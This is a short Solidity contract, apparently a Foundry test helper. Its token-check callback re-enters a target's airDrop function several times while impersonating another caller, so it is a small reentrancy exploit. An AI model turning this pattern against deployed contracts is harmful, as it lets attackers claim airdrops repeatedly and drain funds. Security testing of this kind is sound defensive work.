contract ReentrantBank {
    C target;
    address caller;
    uint8 depth;
    uint8 count;
    constructor(C _target, address _caller, uint8 _depth) {
        target = _target;
        caller = _caller;
        depth = _depth;
        count = 0;
    }
    function supportsToken() external returns (bytes32) {
        if (count < depth) {
            count++;
            vm.prank(caller);
            target.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}

